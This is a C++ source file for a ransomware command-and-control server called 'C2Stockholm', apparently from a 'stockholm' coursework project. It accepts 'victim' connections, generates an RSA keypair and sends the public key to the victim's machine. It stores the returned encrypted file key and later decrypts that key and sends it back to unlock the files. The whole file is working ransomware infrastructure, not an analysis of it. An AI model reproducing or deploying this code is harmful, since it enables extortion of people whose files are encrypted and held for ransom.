#include "../incs/c2_stockholm.hpp"

C2Stockholm::C2Stockholm(std::string __ip, int __port) 
: ip_(__ip), port_(__port), sockfd_(-1) {
    if (init() < 0) {
        std::cerr << RED << "Failed to initialize C2Stockholm" << RESET << std::endl;
        exit(EXIT_FAILURE);
    }
}

int C2Stockholm::init() {
    sockfd_ = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd_ < 0) {
        std::cerr << RED << "Failed to create socket" << RESET << std::endl;
        return -1;
    }

    int opt = 0;
    if (setsockopt(sockfd_, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        std::cerr << RED << "Failed to set socket options" << RESET << std::endl;
        return -1;
    }

    server_addr_.sin_family = AF_INET;
    server_addr_.sin_port = htons(port_);
    if (inet_pton(AF_INET, ip_.c_str(), &server_addr_.sin_addr) <= 0) {
        std::cerr << RED << "Invalid address" << RESET << std::endl;
        return -1;
    }

    if (bind(sockfd_, (struct sockaddr *)&server_addr_, sizeof(server_addr_)) < 0) {
        std::cerr << RED << "Failed to bind socket" << RESET << std::endl;
        return -1;
    }

    if (listen(sockfd_, 1) < 0) {
        std::cerr << RED << "Failed to listen on socket" << RESET << std::endl;
        return -1;
    }

    std::cout << GREEN << "C2Stockholm initialized" << RESET << std::endl;
    std::cout << GREEN << "Listening on " << ip_ << ":" << port_ << RESET << std::endl;
    return 0;
}

/**
 * Initialize a connection
 * If cmd is CMD_CIPHER, it will generate a keypair and send the public key to the client in a 3 step process
 *    1. Send the command code
 *    2. Send the public key size
 *    3. Send the public key
 *    It will then wait for the client to generate a key using the public key we send, recieve that key then save it in ENCRYPTED_FILE
 * If cmd is CMD_DECIPHER, it will send encrypt the key in ENCRYPTED_FILE using the private key and send it to the client so that it can decipher the files 
 */
int C2Stockholm::run(CommandCode cmd) {
    ssize_t rc;
    int recv_status;
    CommandCode ack = NONE;

    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    int client_sockfd = accept(sockfd_, (struct sockaddr*)&client_addr, &client_addr_len);
    if (client_sockfd < 0) {
        std::cerr << RED << "Failed to accept connection" << RESET << std::endl;
        return -1;
    }
    std::cout << GREEN << "Victim connected from: " << inet_ntoa(client_addr.sin_addr) << RESET << std::endl;

    // Send command code
    while (ack != ACK) {
        rc = send(client_sockfd, &cmd, sizeof(CommandCode), 0);
        if (rc < 0) {
            std::cerr << RED << "Failed to send command code" << RESET << std::endl;
            close(client_sockfd);
            return -1;
        }

        recv_status = recv(client_sockfd, &ack, sizeof(CommandCode), 0);
        if (recv_status < 0) {
            std::cerr << RED << "Failed to receive ACK" << RESET << std::endl;
            close(client_sockfd);
            return -1;
        } else if (recv_status == 0) {
            std::cerr << RED << "Server disconnected" << RESET << std::endl;
            close(client_sockfd);
            return -1;
        }
        if (ack == ACK) {
            ack = NONE;
            break;
        }
    }

    if (cmd == CMD_CIPHER) {
        std::ofstream out_file;

        if (std::filesystem::exists(PUBLIC_KEY) || std::filesystem::exists(PRIVATE_KEY)) {
            std::string a;
            while (true) {
                std::cout << YELLOW << "Warning: key already exists. Do you want to overwrite it? (y/n): " RESET;
                std::getline(std::cin, a);
                if (a == "y" || a == "Y") {
                    generate_keypair();
                    break;
                } else {
                    std::cout << YELLOW << "Using the existing key pair" << RESET << std::endl;
                }
            }
        } else {
            generate_keypair();
        }

        EVP_PKEY* public_key = load_public_key();
        if (!public_key) {
            std::cerr << RED << "Failed to load public key" << RESET << std::endl;
            return -1;
        }
        long out_len = serialize_publickey(public_key);
        if (out_len < 0) {
            std::cerr << RED << "Failed to serialize public key" << RESET << std::endl;
            EVP_PKEY_free(public_key);
            close(client_sockfd);
            return -1;
        }
        long total_sent = 0;
        long sent = 0;
        long total_received = 0;
        long recv_len = 0;
        
        while (ack != ACK) {
            rc = send(client_sockfd, &out_len, sizeof(out_len), 0);
            if (rc < 0) {
                std::cerr << RED << "Failed to send public key size" << RESET << std::endl;
                goto fail_cipher;
            }
            recv_status = recv(client_sockfd, &ack, sizeof(CommandCode), 0);
            if (recv_status < 0) {
                std::cerr << RED << "Failed to receive ACK" << RESET << std::endl;
                goto fail_cipher;
            } else if (recv_status == 0) {
                std::cerr << RED << "Server disconnected" << RESET << std::endl;
                goto fail_cipher;
            }
            if (ack != ACK) {
                continue;
            }
            while (total_sent < out_len) {
                sent = send(client_sockfd, public_key_.data() + sent, out_len - total_sent, 0);
                if (sent < 0) {
                    std::cerr << RED << "Failed to send public key" << RESET << std::endl;
                    goto fail_cipher;
                } else if (sent == 0) {
                    std::cerr << RED << "Server disconnected" << RESET << std::endl;
                    goto fail_cipher;
                }
                total_sent += sent;
            }

            recv_status = recv(client_sockfd, &ack, sizeof(CommandCode), 0);
            if (recv_status < 0) {
                std::cerr << RED << "Failed to receive ACK" << RESET << std::endl;
                goto fail_cipher;
            } else if (recv_status == 0) {
                std::cerr << RED << "Server disconnected" << RESET << std::endl;
                goto fail_cipher;
            }

            if (ack == ACK) {
                break;
            }
        }

        // Wait for the client to send the encrypted key and save it in ENCRYPTED_FILE
        rc = recv(client_sockfd, &recv_len, sizeof(recv_len), 0);
        if (rc < 0) {
            std::cerr << RED << "Failed to receive encrypted key size" << RESET << std::endl;
            goto fail_cipher;
        } else if (rc == 0) {
            std::cerr << RED << "Server disconnected" << RESET << std::endl;
            goto fail_cipher;
        }
        
        encrypted_cipher_.resize(recv_len);
        while (total_received < recv_len) {
            rc = recv(client_sockfd, &encrypted_cipher_[total_received], recv_len - total_received, 0); 
            if (rc < 0) {
                std::cerr << RED << "Failed to receive encrypted key" << RESET << std::endl;
                goto fail_cipher;
            } else if (rc == 0) {
                std::cerr << RED << "Server disconnected" << RESET << std::endl;
                goto fail_cipher;
            }

            total_received += rc;
        }

        std::cout << GREEN << "Saving encrypted key to " ENCRYPTED_FILE << RESET << std::endl;
        out_file.open(ENCRYPTED_FILE, std::ios::binary);
        if (!out_file) {
            std::cerr << RED << "Failed to open " ENCRYPTED_FILE " for writing" << RESET << std::endl;
            goto fail_cipher;
        }
        out_file.write(reinterpret_cast<const char*>(encrypted_cipher_.data()), recv_len);
        out_file.close();
        EVP_PKEY_free(public_key);
        close(client_sockfd);
        return 0;

        fail_cipher:
            EVP_PKEY_free(public_key);
            close(client_sockfd);
            return -1;
        
    } else if (cmd == CMD_DECIPHER) {
        if (!std::filesystem::exists(ENCRYPTED_FILE)) {
            std::cerr << RED << "Error: " ENCRYPTED_FILE " not found" RESET << std::endl;
            close(client_sockfd);
            return -1;
        }

        EVP_PKEY* private_key = load_private_key();
        if (!private_key) {
            std::cerr << RED << "Failed to load private key" << RESET << std::endl;
            close(client_sockfd);
            return -1;
        }

        std::ifstream in_file;
        std::streamsize file_size = get_file_size();
        if (file_size < 0) {
            std::cerr << RED << "Failed to get file size" << RESET << std::endl;
            EVP_PKEY_free(private_key);
            close(client_sockfd);
            return -1;
        }

        in_file.open(ENCRYPTED_FILE, std::ios::binary);
        if (!in_file) {
            std::cerr << RED << "Failed to open " ENCRYPTED_FILE " for reading" << RESET << std::endl;
            EVP_PKEY_free(private_key);
            close(client_sockfd);
            return -1;
        }

        encrypted_cipher_.resize(file_size);
        in_file.read(reinterpret_cast<char*>(encrypted_cipher_.data()), file_size);
        in_file.close();

        rc = rsa_decrypt(private_key, encrypted_cipher_);
        if (rc < 0) {
            std::cerr << RED << "Failed to decrypt cipher" << RESET << std::endl;
            EVP_PKEY_free(private_key);
            close(client_sockfd);
            return -1;
        }
        std::cout << GREEN << "Decrypted cipher: " << decrypted_cipher_ << RESET << std::endl;

        // Send the decrypted cipher to the client
        send(client_sockfd, decrypted_cipher_.c_str(), decrypted_cipher_.size(), 0);

        close(client_sockfd);
        EVP_PKEY_free(private_key);
        return 0;
    }

    return 0;
}

std::streamsize C2Stockholm::get_file_size() {
    std::ifstream file(ENCRYPTED_FILE, std::ios::binary | std::ios::ate);
    if (!file) {
        std::cerr << RED << "Failed to open " ENCRYPTED_FILE " for reading" << RESET << std::endl;
        return -1;
    }

    return file.tellg();
}

void C2Stockholm::cleanup() {
    close(sockfd_);
}

long C2Stockholm::serialize_publickey(EVP_PKEY* key) {
    BIO* bio = BIO_new(BIO_s_mem()); 
    if (!bio) {
        std::cerr << RED << "Failed to create BIO" << RESET << std::endl;
        return -1;
    }

    if (PEM_write_bio_PUBKEY(bio, key) != 1) {
        std::cerr << RED << "Failed to write public key to BIO" << RESET << std::endl;
        BIO_free(bio);
        return -1;
    }

    char* buffer = nullptr;
    long key_len = BIO_get_mem_data(bio, &buffer);
    public_key_.assign(buffer, key_len);

    BIO_free(bio);
    return key_len;
}

int C2Stockholm::generate_keypair() {
    EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, nullptr);

    if (EVP_PKEY_keygen_init(ctx) <= 0) {
        std::cerr << RED << "Failed to initialize keygen" << RESET << std::endl;
        EVP_PKEY_CTX_free(ctx);
        return -1;
    }

    if (EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 2048) <= 0) {
        std::cerr << RED << "Failed to set RSA key size" << RESET << std::endl;
        EVP_PKEY_CTX_free(ctx);
        return -1;
    }

    EVP_PKEY* pkey = nullptr;
    if (EVP_PKEY_keygen(ctx, &pkey) <= 0) {
        std::cerr << RED << "Failed to generate keypair" << RESET << std::endl;
        EVP_PKEY_CTX_free(ctx);
        return -1;
    }

    EVP_PKEY_CTX_free(ctx);

    // Public key
    FILE* pub = fopen(PUBLIC_KEY, "wb");
    if (!pub || PEM_write_PUBKEY(pub, pkey) != 1) {
        std::cerr << RED << "Failed to write public key" << RESET << std::endl;
        if (pub) fclose(pub);
        EVP_PKEY_free(pkey);
        return -1;
    }
    fclose(pub);

    // Private key
    FILE* priv = fopen(PRIVATE_KEY, "wb");
    if (!priv || PEM_write_PrivateKey(priv, pkey, nullptr, nullptr, 0, nullptr, nullptr) != 1) {
        std::cerr << RED << "Failed to write private key" << RESET << std::endl;
        if (priv) fclose(priv);
        EVP_PKEY_free(pkey);
        return -1;
    }
    fclose(priv);


    EVP_PKEY_free(pkey);

    std::cout << GREEN << "Keypair generated successfully" << RESET << std::endl;

    return 0;
}

EVP_PKEY* C2Stockholm::load_public_key() {
    FILE* pub = fopen(PUBLIC_KEY, "rb");
    if (!pub) {
        return nullptr;
    }

    EVP_PKEY* pkey = PEM_read_PUBKEY(pub, nullptr, nullptr, nullptr);
    fclose(pub);
    return pkey ? pkey : nullptr;
}

EVP_PKEY* C2Stockholm::load_private_key() {
    FILE* priv = fopen(PRIVATE_KEY, "rb");
    if (!priv) return nullptr;

    EVP_PKEY* pkey = PEM_read_PrivateKey(priv, nullptr, nullptr, nullptr);
    fclose(priv);
    return pkey ? pkey : nullptr;
}

int C2Stockholm::rsa_decrypt(EVP_PKEY* private_key, const std::vector<unsigned char>& cipher) {
    size_t outlen;
    std::vector<unsigned char> out;

    EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(private_key, nullptr);
    if (!ctx) {
        return -1;
    }

    if (EVP_PKEY_decrypt_init(ctx) <= 0) {
        goto fail;
    }
    if (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0) {
        goto fail;
    }
    if (EVP_PKEY_decrypt(ctx, nullptr, &outlen, cipher.data(), cipher.size()) <= 0) {
        goto fail;
    }

    if (EVP_PKEY_decrypt(ctx, nullptr, &outlen, cipher.data(), cipher.size()) <= 0) { // Size query
        goto fail;
    }

    out.resize(outlen);
    if (EVP_PKEY_decrypt(ctx, out.data(), &outlen, cipher.data(), cipher.size()) <= 0) {
        goto fail;
    }

    decrypted_cipher_.assign(out.begin(), out.end());

    EVP_PKEY_CTX_free(ctx);
    return 0;

    fail:
        EVP_PKEY_CTX_free(ctx);
        return -1;

}